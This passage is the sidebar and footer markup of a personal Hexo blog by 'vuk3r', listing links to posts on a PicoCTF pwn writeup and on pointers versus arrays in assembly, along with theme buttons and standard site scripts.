title="Created 2026-02-02 21:41:01">2026-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "><img src="/img/post/dummy/different-between-Pointer-and-Array/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "/></a><div class="content"><a class="title" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? ">[Dummy] - How different between Pointer and Array from Assembly Perspective ? </a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img src="/img/post/writeup/picoctf/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Writeup] - Solving Pwn on PicoCTF"/></a><div class="content"><a class="title" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF">[Writeup] - Solving Pwn on PicoCTF</a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div></div></div></div></div></main><footer id="footer" style="background: black;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By vuk3r</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div><div class="footer_custom_text">Hope you like my profile</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
